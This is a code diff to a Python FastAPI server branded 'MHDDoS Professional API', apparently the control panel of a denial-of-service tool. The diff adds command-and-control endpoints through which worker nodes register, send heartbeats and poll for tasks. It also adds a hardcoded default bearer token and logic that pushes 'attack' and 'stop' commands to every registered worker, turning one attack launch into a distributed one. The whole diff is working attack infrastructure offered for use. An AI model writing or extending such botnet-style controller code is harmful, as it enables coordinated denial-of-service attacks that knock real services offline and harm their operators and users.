@@ -10,10 +10,12 @@ from pathlib import Path
 from tkinter import filedialog
 from typing import Any
 from urllib.parse import urlparse
+import uuid
+import os
 
 import psutil
 import uvicorn
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel, ConfigDict, Field
 
@@ -54,8 +56,13 @@ app = FastAPI(title="MHDDoS Professional API", version="1.1.3")
 class C2State:
     is_worker_mode: bool = "--worker" in sys.argv
     master_url: str | None = None
-    import uuid
     node_id: str = str(uuid.uuid4())[:8]
+
+    # C2 Master tracking
+    token: str = os.getenv("C2_TOKEN", "MHDDoS_SECRET_1337")
+    workers: dict[str, dict] = {} # node_id -> info
+    pending_tasks: dict[str, list[dict]] = {} # node_id -> tasks
+    active_task_id: str | None = None
 
 C2 = C2State()
 
@@ -76,6 +83,7 @@ class AttackParams(BaseModel):
     smart_rpc: bool = False
     autoscale: bool = False
     evasion: bool = False
+    distribute_to_workers: bool = False
 
 class ProxyProvider(BaseModel):
     type: int
@@ -332,8 +340,60 @@ async def health_check() -> HealthResponse:
         status="online",
         engine_active=state.process is not None,
         is_starting=state.is_starting,
-        version="1.1.1"
+        version="1.1.3"
     )
+
+# --- C2 Master Endpoints ---
+def _check_c2_token(request: Request) -> bool:
+    return request.headers.get("Authorization", "") == f"Bearer {C2.token}"
+
+@app.post("/api/c2/register")
+async def c2_register(request: Request, data: dict):
+    if not _check_c2_token(request):
+        return {"status": "error", "message": "Invalid token"}
+    node_id = request.headers.get("X-Node-ID")
+    if not node_id:
+        return {"status": "error"}
+    
+    data["last_seen"] = time.time()
+    C2.workers[node_id] = data
+    if node_id not in C2.pending_tasks:
+        C2.pending_tasks[node_id] = []
+    return {"status": "success", "message": "Registered"}
+
+@app.post("/api/c2/heartbeat")
+async def c2_heartbeat(request: Request, data: dict):
+    if not _check_c2_token(request):
+        return {"status": "error"}
+    node_id = request.headers.get("X-Node-ID")
+    if node_id and node_id in C2.workers:
+        C2.workers[node_id].update(data)
+        C2.workers[node_id]["last_seen"] = time.time()
+    return {"status": "success"}
+
+@app.get("/api/c2/poll")
+async def c2_poll(request: Request):
+    if not _check_c2_token(request):
+        return {"status": "error"}
+    node_id = request.headers.get("X-Node-ID")
+    if node_id and node_id in C2.pending_tasks and C2.pending_tasks[node_id]:
+        task = C2.pending_tasks[node_id].pop(0)
+        return {"status": "success", "task": task}
+    return {"status": "success", "task": None}
+
+@app.post("/api/c2/task_complete")
+async def c2_task_complete(request: Request, data: dict):
+    return {"status": "success"}
+
+@app.get("/api/c2/nodes")
+async def c2_nodes():
+    now = time.time()
+    dead = [nid for nid, w in C2.workers.items() if now - w.get("last_seen", 0) > 30]
+    for nid in dead:
+        del C2.workers[nid]
+        if nid in C2.pending_tasks:
+            del C2.pending_tasks[nid]
+    return {"status": "success", "workers": list(C2.workers.values())}
 
 
 class AnalyzeParams(BaseModel):
@@ -385,14 +445,30 @@ async def start_attack(params: AttackParams) -> StatusResponse:
     if state.process is not None or state.is_starting:
         return StatusResponse(status="error", message="An attack sequence is already in progress.")
     
+    C2.active_task_id = str(uuid.uuid4())[:8]
+    if params.distribute_to_workers:
+        params_dict = params.model_dump() if hasattr(params, 'model_dump') else params.dict()
+        for nid in list(C2.workers.keys()):
+            C2.pending_tasks[nid].append({
+                "action": "attack",
+                "task_id": C2.active_task_id,
+                "params": params_dict
+            })
+        asyncio.create_task(broadcast_log(f"[*] C2 MASTER: Dispatching task {C2.active_task_id} to {len(C2.workers)} workers."))
+    
     state.is_starting = True
     asyncio.create_task(run_attack_subprocess(params))
     return StatusResponse(status="success", message="Attack sequence initiated.")
 
 @app.post("/api/attack/stop", response_model=StatusResponse)
 async def stop_attack() -> StatusResponse:
+    # Broadcast stop to workers
+    for nid in list(C2.workers.keys()):
+        C2.pending_tasks[nid].append({"action": "stop", "task_id": C2.active_task_id})
+    C2.active_task_id = None
+
     if state.process is None:
-        return StatusResponse(status="error", message="No active engine process found.")
+        return StatusResponse(status="error", message="No active engine process found locally (workers commanded to stop).")
     
     await broadcast_log("[*] INITIATING RECURSIVE TERMINATION: Cleaning up process tree...")
     try:
